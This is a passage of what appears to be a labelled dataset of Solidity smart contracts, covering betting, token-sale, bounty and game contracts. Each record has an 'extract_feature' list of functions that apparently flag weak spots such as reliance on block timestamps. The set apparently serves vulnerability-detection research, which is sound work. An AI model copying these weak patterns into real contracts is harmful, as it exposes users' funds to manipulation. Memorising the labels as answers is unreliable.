voterIndex[msg.sender].rewarded = true;\n msg.sender.transfer(transfer_amount);\n emit Withdraw(msg.sender, transfer_amount);\n }\n function forceVoidRace() internal {\n chronus.voided_bet=true;\n chronus.race_end = true;\n chronus.voided_timestamp=uint32(now);\n }\n function getCoinIndex(bytes32 index, address candidate) external constant returns (uint, uint, uint, bool, uint) {\n uint256 coinPrePrice;\n uint256 coinPostPrice;\n if (coinIndex[horses.ETH].pre > 0 && coinIndex[horses.BTC].pre > 0 && coinIndex[horses.LTC].pre > 0) {\n coinPrePrice = coinIndex[index].pre;\n }\n if (coinIndex[horses.ETH].post > 0 && coinIndex[horses.BTC].post > 0 && coinIndex[horses.LTC].post > 0) {\n coinPostPrice = coinIndex[index].post;\n }\n return (coinIndex[index].total, coinPrePrice, coinPostPrice, coinIndex[index].price_check, voterIndex[candidate].bets[index]);\n }\n function reward_total() external constant returns (uint) {\n return ((coinIndex[horses.BTC].total) + (coinIndex[horses.ETH].total) + (coinIndex[horses.LTC].total));\n }\n function refund() external onlyOwner {\n require(now > chronus.starting_time + chronus.race_duration);\n require((chronus.betting_open && !chronus.race_start)\n || (chronus.race_start && !chronus.race_end));\n chronus.voided_bet = true;\n chronus.race_end = true;\n chronus.voided_timestamp=uint32(now);\n }\n function recovery() external onlyOwner{\n require((chronus.race_end && now > chronus.starting_time + chronus.race_duration + (30 days))\n || (chronus.voided_bet && now > chronus.voided_timestamp + (30 days)));\n house_takeout.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function setupRace(uint32 _bettingDuration, uint32 _raceDuration) onlyOwner beforeBetting external payable {\nchronus.starting_time = uint32(block.timestamp);\nchronus.betting_open = true;\nchronus.betting_duration = _bettingDuration;\nchronus.race_duration = _raceDuration;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1edd"
  },
  "filename": "1318.sol",
  "content": "pragma solidity ^0.4.0;\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract WorkIt is ERC20Interface {\n string public constant name = \"WorkIt Token\";\n string public constant symbol = \"WIT\";\n uint _totalSupply = 0;\n mapping(address => uint) balances;\n mapping(address => mapping(address => uint)) allowances;\n function totalSupply() public constant returns (uint) {\n return _totalSupply;\n }\n function balanceOf(address tokenOwner) public constant returns (uint balance) {\n return balances[tokenOwner];\n }\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return allowances[tokenOwner][spender];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n require(balances[msg.sender] >= tokens);\n balances[msg.sender] = balances[msg.sender] - tokens;\n balances[to] = balances[to] + tokens;\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n allowances[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n require(allowances[from][msg.sender] >= tokens);\n require(balances[from] >= tokens);\n allowances[from][msg.sender] = allowances[from][msg.sender] - tokens;\n balances[from] = balances[from] - tokens;\n balances[to] = balances[to] + tokens;\n emit Transfer(from, to, tokens);\n return true;\n }\n struct WeekCommittment {\n uint daysCompleted;\n uint daysCommitted;\n mapping(uint => uint) workoutProofs;\n uint tokensCommitted;\n uint tokensEarned;\n bool tokensPaid;\n }\n struct WeekData {\n bool initialized;\n uint totalPeopleCompleted;\n uint totalPeople;\n uint totalDaysCommitted;\n uint totalDaysCompleted;\n uint totalTokensCompleted;\n uint totalTokens;\n }\n uint public weiPerToken = 1000000000000000;\n uint secondsPerDay = 86400;\n uint daysPerWeek = 7;\n mapping(uint => WeekData) public dataPerWeek;\n mapping (address => mapping(uint => WeekCommittment)) public commitments;\n mapping(uint => string) imageHashes;\n uint imageHashCount;\n uint public startDate;\n address public owner;\n constructor() public {\n owner = msg.sender;\n startDate = (block.timestamp / secondsPerDay) * secondsPerDay - 60 * 6;\n }\n event Log(string message);\n function () public payable {\n buyTokens(msg.value / weiPerToken);\n }\n function buyTokens(uint tokens) public payable {\n require(msg.value >= tokens * weiPerToken);\n balances[msg.sender] += tokens;\n _totalSupply += tokens;\n }\n function commitToWeek(uint tokens, uint _days) public {\n if (balances[msg.sender] < tokens || tokens < 10) {\n emit Log(\"You need to bet at least 10 tokens to commit\");\n require(false);\n }\n if (_days == 0) {\n emit Log(\"You cannot register for 0 days of activity\");\n require(false);\n }\n if (_days > daysPerWeek) {\n emit Log(\"You cannot register for more than 7 days per week\");\n require(false);\n }\n if (_days > daysPerWeek - currentDayOfWeek()) {\n emit Log(\"It is too late in the week for you to register\");\n require(false);\n }\n WeekCommittment storage commitment = commitments[msg.sender][currentWeek()];\n if (commitment.tokensCommitted != 0) {\n emit Log(\"You have already committed to this week\");\n require(false);\n }\n balances[0x0] = balances[0x0] + tokens;\n balances[msg.sender] = balances[msg.sender] - tokens;\n emit Transfer(msg.sender, 0x0, tokens);\n initializeWeekData(currentWeek());\n WeekData storage data = dataPerWeek[currentWeek()];\n data.totalPeople++;\n data.totalTokens += tokens;\n data.totalDaysCommitted += _days;\n commitment.daysCommitted = _days;\n commitment.daysCompleted = 0;\n commitment.tokensCommitted = tokens;\n commitment.tokensEarned = 0;\n commitment.tokensPaid = false;\n }\n function payout() public {\n require(currentWeek() > 0);\n for (uint activeWeek = currentWeek() - 1; true; activeWeek--) {\n WeekCommittment storage committment = commitments[msg.sender][activeWeek];\n if (committment.tokensPaid) {\n break;\n }\n if (committment.daysCommitted == 0) {\n committment.tokensPaid = true;\n if (activeWeek == 0) break;\n continue;\n }\n initializeWeekData(activeWeek);\n WeekData storage week = dataPerWeek[activeWeek];\n uint tokensFromPool = 0;\n uint tokens = committment.tokensCommitted * committment.daysCompleted / committment.daysCommitted;\n if (week.totalPeopleCompleted == 0) {\n tokensFromPool = (week.totalTokens - week.totalTokensCompleted) / week.totalPeople;\n tokens = 0;\n } else if (committment.daysCompleted == committment.daysCommitted) {\n tokensFromPool = (week.totalTokens - week.totalTokensCompleted) / week.totalPeopleCompleted;\n }\n uint totalTokens = tokensFromPool + tokens;\n if (totalTokens == 0) {\n committment.tokensPaid = true;\n if (activeWeek == 0) break;\n continue;\n }\n balances[0x0] = balances[0x0] - totalTokens;\n balances[msg.sender] = balances[msg.sender] + totalTokens;\n emit Transfer(0x0, msg.sender, totalTokens);\n committment.tokensEarned = totalTokens;\n committment.tokensPaid = true;\n if (activeWeek == 0) break;\n }\n }\n function postProof(string proofHash) public {\n WeekCommittment storage committment = commitments[msg.sender][currentWeek()];\n if (committment.daysCompleted > currentDayOfWeek()) {\n emit Log(\"You have already uploaded proof for today\");\n require(false);\n }\n if (committment.tokensCommitted == 0) {\n emit Log(\"You have not committed to this week yet\");\n require(false);\n }\n if (committment.workoutProofs[currentDayOfWeek()] != 0) {\n emit Log(\"Proof has already been stored for this day\");\n require(false);\n }\n if (committment.daysCompleted >= committment.daysCommitted) {\n return;\n }\n committment.workoutProofs[currentDayOfWeek()] = storeImageString(proofHash);\n committment.daysCompleted++;\n initializeWeekData(currentWeek());\n WeekData storage week = dataPerWeek[currentWeek()];\n week.totalDaysCompleted++;\n week.totalTokensCompleted = week.totalTokens * week.totalDaysCompleted / week.totalDaysCommitted;\n if (committment.daysCompleted >= committment.daysCommitted) {\n week.totalPeopleCompleted++;\n }\n }\n function withdraw(uint tokens) public returns (bool success) {\n require(balances[msg.sender] >= tokens);\n uint weiToSend = tokens * weiPerToken;\n require(address(this).balance >= weiToSend);\n balances[msg.sender] = balances[msg.sender] - tokens;\n _totalSupply -= tokens;\n return msg.sender.send(tokens * weiPerToken);\n }\n function storeImageString(string hash) public returns (uint index) {\n imageHashes[++imageHashCount] = hash;\n return imageHashCount;\n }\n function initializeWeekData(uint _week) public {\n if (dataPerWeek[_week].initialized) return;\n WeekData storage week = dataPerWeek[_week];\n week.initialized = true;\n week.totalTokensCompleted = 0;\n week.totalPeopleCompleted = 0;\n week.totalTokens = 0;\n week.totalPeople = 0;\n week.totalDaysCommitted = 0;\n week.totalDaysCompleted = 0;\n }\n function currentDay() public view returns (uint day) {\n return (block.timestamp - startDate) / secondsPerDay;\n }\n function currentWeek() public view returns (uint week) {\n return currentDay() / daysPerWeek;\n }\n function currentDayOfWeek() public view returns (uint dayIndex) {\n return currentDay() - (currentWeek() * daysPerWeek);\n }\n}",
  "extract_feature": [
    "function currentDay() public view returns (uint day) {\nreturn (block.timestamp - startDate) / secondsPerDay;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ede"
  },
  "filename": "1667.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ReentrancyGuard {\n uint private constant REENTRANCY_GUARD_FREE = 1;\n uint private constant REENTRANCY_GUARD_LOCKED = 2;\n uint private reentrancyLock = REENTRANCY_GUARD_FREE;\n modifier nonReentrant() {\n require(reentrancyLock == REENTRANCY_GUARD_FREE);\n reentrancyLock = REENTRANCY_GUARD_LOCKED;\n _;\n reentrancyLock = REENTRANCY_GUARD_FREE;\n }\n}\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ninterface ERC20 {\n function totalSupply() external view returns (uint supply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n function decimals() external view returns(uint digits);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\ncontract JobsBounty is Ownable, ReentrancyGuard {\n using SafeMath for uint256;\n string public companyName;\n string public jobPost;\n uint public endDate;\n address public INDToken;\n constructor(string _companyName,\n string _jobPost,\n uint _endDate,\n address _INDToken\n ) public{\n companyName = _companyName;\n jobPost = _jobPost ;\n endDate = _endDate;\n INDToken = _INDToken;\n }\n function ownBalance() public view returns(uint256) {\n return SafeMath.div(ERC20(INDToken).balanceOf(this),1 ether);\n }\n function payOutBounty(address _referrerAddress, address _candidateAddress) external onlyOwner nonReentrant returns(bool){\n assert(block.timestamp >= endDate);\n assert(_referrerAddress != address(0x0));\n assert(_candidateAddress != address(0x0));\n uint256 individualAmounts = SafeMath.mul(SafeMath.div((ERC20(INDToken).balanceOf(this)),100),50);\n assert(ERC20(INDToken).transfer(_candidateAddress, individualAmounts));\n assert(ERC20(INDToken).transfer(_referrerAddress, individualAmounts));\n return true;\n }\n function withdrawERC20Token(address anyToken) external onlyOwner nonReentrant returns(bool){\n assert(block.timestamp >= endDate);\n assert(ERC20(anyToken).transfer(owner, ERC20(anyToken).balanceOf(this)));\n return true;\n }\n function withdrawEther() external onlyOwner nonReentrant returns(bool){\n if(address(this).balance > 0){\n owner.transfer(address(this).balance);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function payOutBounty(address _referrerAddress, address _candidateAddress) external onlyOwner nonReentrant returns(bool){\nassert(block.timestamp >= endDate);\nassert(_referrerAddress != address(0x0));\nassert(_candidateAddress != address(0x0));\nuint256 individualAmounts = SafeMath.mul(SafeMath.div((ERC20(INDToken).balanceOf(this)),100),50);\nassert(ERC20(INDToken).transfer(_candidateAddress, individualAmounts));\nassert(ERC20(INDToken).transfer(_referrerAddress, individualAmounts));\nreturn true;\n}",
    "function withdrawERC20Token(address anyToken) external onlyOwner nonReentrant returns(bool){\nassert(block.timestamp >= endDate);\nassert(ERC20(anyToken).transfer(owner, ERC20(anyToken).balanceOf(this)));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1edf"
  },
  "filename": "1671.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract EthertoteToken {\n function thisContractAddress() public pure returns (address) {}\n function balanceOf(address) public pure returns (uint256) {}\n function transfer(address, uint) public {}\n}\ncontract TokenSale {\n using SafeMath for uint256;\n EthertoteToken public token;\n address public admin;\n address public thisContractAddress;\n address public tokenContractAddress = 0x42be9831FFF77972c1D0E1eC0aA9bdb3CaA04D47;\n address public tokenBurnAddress = 0xadCa18DC9489C5FE5BdDf1A8a8C2623B66029198;\n address public ethRaisedAddress = 0x9F73D808807c71Af185FEA0c1cE205002c74123C;\n uint public preIcoPhaseCountdown;\n uint public icoPhaseCountdown;\n uint public postIcoPhaseCountdown;\n bool public tokenSaleIsPaused;\n uint public tokenSalePausedTime;\n uint public tokenSaleResumedTime;\n uint public tokenSalePausedDuration;\n uint256 public weiRaised;\n uint public maxEthRaised = 9000;\n uint public maxWeiRaised = maxEthRaised.mul(1000000000000000000);\n uint public openingTime = 1535990400;\n uint public closingTime = openingTime.add(7 days);\n uint public rate = 1000000000000000;\n uint public minSpend = 100000000000000000;\n uint public maxSpend = 100000000000000000000;\n modifier onlyAdmin {\n require(msg.sender == admin\n );\n _;\n }\n event Deployed(string, uint);\n event SalePaused(string, uint);\n event SaleResumed(string, uint);\n event TokensBurned(string, uint);\n constructor() public {\n admin = msg.sender;\n thisContractAddress = address(this);\n token = EthertoteToken(tokenContractAddress);\n require(ethRaisedAddress != address(0));\n require(tokenContractAddress != address(0));\n require(tokenBurnAddress != address(0));\n preIcoPhaseCountdown = openingTime;\n icoPhaseCountdown = closingTime;\n postIcoPhaseCountdown = closingTime.add(14 days);\n emit Deployed(\"Ethertote Token Sale contract deployed\", now);\n }\n function tokenSaleTokenBalance() public view returns(uint) {\n return token.balanceOf(thisContractAddress);\n }\n function getAnyAddressTokenBalance(address _address) public view returns(uint) {\n return token.balanceOf(_address);\n }\n function tokenSaleHasFinished() public view returns (bool) {\n return now > closingTime;\n }\n function burnUnsoldTokens() public {\n require(tokenSaleIsPaused == false);\n require(tokenSaleHasFinished() == true);\n token.transfer(tokenBurnAddress, tokenSaleTokenBalance());\n emit TokensBurned(\"tokens sent to TokenBurn contract\", now);\n }\n function pauseTokenSale() onlyAdmin public {\n require(tokenSaleHasFinished() == false);\n require(tokenSaleIsPaused == false);\n tokenSaleIsPaused = true;\n tokenSalePausedTime = now;\n emit SalePaused(\"token sale has been paused\", now);\n }\n function resumeTokenSale() onlyAdmin public {\n require(tokenSaleIsPaused == true);\n tokenSaleResumedTime = now;\n tokenSalePausedDuration = tokenSaleResumedTime.sub(tokenSalePausedTime);\n closingTime = closingTime.add(tokenSalePausedDuration);\n postIcoPhaseCountdown = closingTime.add(14 days);\n tokenSaleIsPaused = false;\n emit SaleResumed(\"token sale has now resumed\", now);\n }\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address buyer) public payable {\n require(openingTime <= block.timestamp);\n require(block.timestamp < closingTime);\n require(msg.value >= minSpend);\n require(msg.value <= maxSpend);\n require(tokenSaleTokenBalance() > 0);\n require(tokenSaleIsPaused == false);\n uint256 weiAmount = msg.value;\n preValidatePurchase(buyer, weiAmount);\n uint256 tokens = getTokenAmount(weiAmount);\n require(tokens <= tokenSaleTokenBalance());\n weiRaised = weiRaised.add(weiAmount);\n processPurchase(buyer, tokens);\n emit TokenPurchase(\n msg.sender,\n buyer,\n weiAmount,\n tokens\n );\n updatePurchasingState(buyer, weiAmount);\n forwardFunds();\n postValidatePurchase(buyer, weiAmount);\n }\n function preValidatePurchase(\n address buyer,\n uint256 weiAmount\n )\n internal pure\n {\n require(buyer != address(0));\n require(weiAmount != 0);\n }\n function postValidatePurchase(\n address,\n uint256\n )\n internal pure\n {\n }\n function deliverTokens(\n address buyer,\n uint256 tokenAmount\n )\n internal\n {\n token.transfer(buyer, tokenAmount);\n }\n function processPurchase(\n address buyer,\n uint256 tokenAmount\n )\n internal\n {\n deliverTokens(buyer, tokenAmount);\n }\n function updatePurchasingState(\n address,\n uint256\n )\n internal pure\n {\n }\n function getTokenAmount(uint256 weiAmount)\n internal view returns (uint256)\n {\n return weiAmount.div(rate);\n }\n function forwardFunds() internal {\n ethRaisedAddress.transfer(msg.value);\n }\n function maximumRaised() public view returns(uint) {\n return maxWeiRaised;\n }\n function amountRaised() public view returns(uint) {\n return weiRaised;\n }\n function timeComplete() public view returns(uint) {\n return closingTime;\n }\n function delayOpeningTime(uint256 _openingTime) onlyAdmin public {\n openingTime = _openingTime;\n closingTime = openingTime.add(7 days);\n preIcoPhaseCountdown = openingTime;\n icoPhaseCountdown = closingTime;\n postIcoPhaseCountdown = closingTime.add(14 days);\n }\n}",
  "extract_feature": [
    "function buyTokens(address buyer) public payable {\nrequire(openingTime <= block.timestamp);\nrequire(block.timestamp < closingTime);\nrequire(msg.value >= minSpend);\nrequire(msg.value <= maxSpend);\nrequire(tokenSaleTokenBalance() > 0);\nrequire(tokenSaleIsPaused == false);\nuint256 weiAmount = msg.value;\npreValidatePurchase(buyer, weiAmount);\nuint256 tokens = getTokenAmount(weiAmount);\nrequire(tokens <= tokenSaleTokenBalance());\nweiRaised = weiRaised.add(weiAmount);\nprocessPurchase(buyer, tokens);\nemit TokenPurchase(\nmsg.sender,\nbuyer,\nweiAmount,\ntokens\n);\nupdatePurchasingState(buyer, weiAmount);\nforwardFunds();\npostValidatePurchase(buyer, weiAmount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee0"
  },
  "filename": "1700.sol",
  "content": "contract TheEthGameTrophy {\n string public name;\n string public description;\n string public message;\n address public creator;\n address public owner;\n address public winner;\n uint public rank;\n bool private isAwarded = false;\n event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);\n event Transfer (address indexed _from, address indexed _to);\n constructor () public {\n name = \"The Eth Game Winner\";\n description = \"2019-08-17\";\n rank = 1;\n creator = msg.sender;\n }\n function name() constant public returns (string _name) {\n return name;\n }\n function description() constant public returns (string _description) {\n return description;\n }\n function message() constant public returns (string _message) {\n return message;\n }\n function creator() constant public returns (address _creator) {\n return creator;\n }\n function owner() constant public returns (address _owner) {\n return owner;\n }\n function winner() constant public returns (address _winner) {\n return winner;\n }\n function rank() constant public returns (uint _rank) {\n return rank;\n }\n function award(address _address, string _message) public {\n require(msg.sender == creator && !isAwarded);\n isAwarded = true;\n owner = _address;\n winner = _address;\n message = _message;\n emit Award(block.number, block.timestamp, _address);\n }\n function transfer(address _to) private returns (bool success) {\n require(msg.sender == owner);\n owner = _to;\n emit Transfer(msg.sender, _to);\n return true;\n }\n}",
  "extract_feature": [
    "function award(address _address, string _message) public {\nrequire(msg.sender == creator && !isAwarded);\nisAwarded = true;\nowner = _address;\nwinner = _address;\nmessage = _message;\nemit Award(block.number, block.timestamp, _address);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee1"
  },
  "filename": "1703.sol",
  "content": "pragma solidity ^0.4.13;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\ncontract TheEthGame {\n using SafeMath for uint256;\n struct Player {\n uint256 score;\n uint256 lastCellBoughtOnBlockNumber;\n uint256 numberOfCellsOwned;\n uint256 numberOfCellsBought;\n uint256 earnings;\n uint256 partialHarmonicSum;\n uint256 partialScoreSum;\n address referreal;\n bytes32 name;\n }\n struct Cell {\n address owner;\n uint256 price;\n }\n address public owner;\n uint256 constant private NUMBER_OF_LINES = 6;\n uint256 constant private NUMBER_OF_COLUMNS = 6;\n uint256 constant private NUMBER_OF_CELLS = NUMBER_OF_COLUMNS * NUMBER_OF_LINES;\n uint256 constant private DEFAULT_POINTS_PER_CELL = 3;\n uint256 constant private POINTS_PER_NEIGHBOUR = 1;\n uint256 constant private CELL_STARTING_PRICE = 0.01 ether;\n uint256 constant private BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME = 10000;\n uint256 constant private PRICE_INCREASE_PERCENTAGE = uint(2);\n uint256 constant private REFERREAL_PERCENTAGE = uint(10);\n uint256 constant private POT_PERCENTAGE = uint(30);\n uint256 constant private DEVELOPER_PERCENTAGE = uint(5);\n uint256 constant private SCORE_PERCENTAGE = uint(25);\n uint256 constant private NUMBER_OF_CELLS_PERCENTAGE = uint(30);\n Cell[NUMBER_OF_CELLS] cells;\n address[] private ranking;\n mapping(address => Player) players;\n mapping(bytes32 => address) nameToAddress;\n uint256 public numberOfCellsBought;\n uint256 private totalScore;\n uint256 private developersCut = 0 ether;\n uint256 private potCut = 0 ether;\n uint256 private harmonicSum;\n uint256 private totalScoreSum;\n address private rankOnePlayerAddress;\n uint256 private isFirstSinceBlock;\n address public trophyAddress;\n event Bought (address indexed _from, address indexed _to);\n constructor () public {\n owner = msg.sender;\n trophyAddress = new TheEthGameTrophy();\n }\n modifier onlyOwner() {\n require(owner == msg.sender);\n _;\n }\n function nextPriceOf (uint256 _cellId) public view returns (uint256 _nextPrice) {\n return priceOf(_cellId).mul(100 + PRICE_INCREASE_PERCENTAGE) / 100;\n }\n function priceOf (uint256 _cellId) public view returns (uint256 _price) {\n if (cells[_cellId].price == 0) {\n return CELL_STARTING_PRICE;\n }\n return cells[_cellId].price;\n }\n function earningsFromNumberOfCells (address _address) internal view returns (uint256 _earnings) {\n return harmonicSum.sub(players[_address].partialHarmonicSum).mul(players[_address].numberOfCellsBought);\n }\n function distributeEarningsBasedOnNumberOfCells (address _address) internal {\n players[_address].earnings = players[_address].earnings.add(earningsFromNumberOfCells(_address));\n players[_address].partialHarmonicSum = harmonicSum;\n }\n function earningsFromScore (address _address) internal view returns (uint256 _earnings) {\n return totalScoreSum.sub(players[_address].partialScoreSum).mul(scoreOf(_address));\n }\n function distributeEarningsBasedOnScore (address _newOwner, address _oldOwner) internal {\n players[_newOwner].earnings = players[_newOwner].earnings.add(earningsFromScore(_newOwner));\n players[_newOwner].partialScoreSum = totalScoreSum;\n if (_oldOwner != address(0)) {\n players[_oldOwner].earnings = players[_oldOwner].earnings.add(earningsFromScore(_oldOwner));\n players[_oldOwner].partialScoreSum = totalScoreSum;\n }\n }\n function earningsOfPlayer () public view returns (uint256 _wei) {\n return players[msg.sender].earnings.add(earningsFromScore(msg.sender)).add(earningsFromNumberOfCells(msg.sender));\n }\n function getRankOnePlayer (address _oldOwner) internal view returns (address _address, uint256 _oldOwnerIndex) {\n address rankOnePlayer;\n uint256 oldOwnerIndex;\n for (uint256 i = 0; i < ranking.length; i++) {\n if (scoreOf(ranking[i]) > scoreOf(rankOnePlayer)) {\n rankOnePlayer = ranking[i];\n } else if (scoreOf(ranking[i]) == scoreOf(rankOnePlayer) && players[ranking[i]].lastCellBoughtOnBlockNumber > players[rankOnePlayer].lastCellBoughtOnBlockNumber) {\n rankOnePlayer = ranking[i];\n }\n if (ranking[i] == _oldOwner) {\n oldOwnerIndex = i;\n }\n }\n return (rankOnePlayer, oldOwnerIndex);\n }\n function buy (uint256 _cellId, address _referreal) payable public {\n require(msg.value >= priceOf(_cellId));\n require(!isContract(msg.sender));\n require(_cellId < NUMBER_OF_CELLS);\n require(msg.sender != address(0));\n require(!isGameFinished());\n require(ownerOf(_cellId) != msg.sender);\n require(msg.sender != _referreal);\n address oldOwner = ownerOf(_cellId);\n address newOwner = msg.sender;\n uint256 price = priceOf(_cellId);\n uint256 excess = msg.value.sub(price);\n bool isReferrealDistributed = distributeToReferreal(price, _referreal);\n if (numberOfCellsBought > 0) {\n harmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));\n if (isReferrealDistributed) {\n totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));\n } else {\n totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));\n }\n }else{\n potCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);\n }\n numberOfCellsBought++;\n distributeEarningsBasedOnNumberOfCells(newOwner);\n players[newOwner].numberOfCellsBought++;\n players[newOwner].numberOfCellsOwned++;\n if (ownerOf(_cellId) != address(0)) {\n players[oldOwner].numberOfCellsOwned--;\n }\n players[newOwner].lastCellBoughtOnBlockNumber = block.number;\n address oldRankOnePlayer = rankOnePlayerAddress;\n (uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);\n distributeEarningsBasedOnScore(newOwner, oldOwner);\n totalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));\n players[newOwner].score = newOwnerScore;\n players[oldOwner].score = oldOwnerScore;\n totalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));\n cells[_cellId].price = nextPriceOf(_cellId);\n if (players[newOwner].numberOfCellsOwned == 1) {\n ranking.push(newOwner);\n }\n if (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {\n (address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);\n if (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {\n delete ranking[oldOwnerIndex];\n }\n rankOnePlayerAddress = rankOnePlayer;\n }else{\n if (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {\n rankOnePlayerAddress = newOwner;\n }\n }\n if (rankOnePlayerAddress != oldRankOnePlayer) {\n isFirstSinceBlock = block.number;\n }\n developersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);\n potCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);\n _transfer(oldOwner, newOwner, _cellId);\n emit Bought(oldOwner, newOwner);\n if (excess > 0) {\n newOwner.transfer(excess);\n }\n }\n function distributeToReferreal (uint256 _price, address _referreal) internal returns (bool _isDstributed) {\n if (_referreal != address(0) && _referreal != msg.sender) {\n players[msg.sender].referreal = _referreal;\n }\n if (players[msg.sender].referreal != address(0)) {\n address ref = players[msg.sender].referreal;\n players[ref].earnings = players[ref].earnings.add(_price.mul(REFERREAL_PERCENTAGE) / 100);\n return true;\n }\n return false;\n }\n function getPlayers () external view returns(uint256[] _scores, uint256[] _lastCellBoughtOnBlock, address[] _addresses, bytes32[] _names) {\n uint256[] memory scores = new uint256[](ranking.length);\n address[] memory addresses = new address[](ranking.length);\n uint256[] memory lastCellBoughtOnBlock = new uint256[](ranking.length);\n bytes32[] memory names = new bytes32[](ranking.length);\n for (uint256 i = 0; i < ranking.length; i++) {\n Player memory p = players[ranking[i]];\n scores[i] = p.score;\n addresses[i] = ranking[i];\n lastCellBoughtOnBlock[i] = p.lastCellBoughtOnBlockNumber;\n names[i] = p.name;\n }\n return (scores, lastCellBoughtOnBlock, addresses, names);\n }\n function getCells () external view returns (uint256[] _prices, uint256[] _nextPrice, address[] _owner, bytes32[] _names) {\n uint256[] memory prices = new uint256[](NUMBER_OF_CELLS);\n address[] memory owners = new address[](NUMBER_OF_CELLS);\n bytes32[] memory names = new bytes32[](NUMBER_OF_CELLS);\n uint256[] memory nextPrices = new uint256[](NUMBER_OF_CELLS);\n for (uint256 i = 0; i < NUMBER_OF_CELLS; i++) {\n prices[i] = priceOf(i);\n owners[i] = ownerOf(i);\n names[i] = players[ownerOf(i)].name;\n nextPrices[i] = nextPriceOf(i);\n }\n return (prices, nextPrices, owners, names);\n }\n function getPlayer () external view returns (bytes32 _name, uint256 _score, uint256 _earnings, uint256 _numberOfCellsBought) {\n return (players[msg.sender].name, players[msg.sender].score, earningsOfPlayer(), players[msg.sender].numberOfCellsBought);\n }\n function getCurrentPotSize () public view returns (uint256 _wei) {\n return potCut;\n }\n function getCurrentWinner () public view returns (address 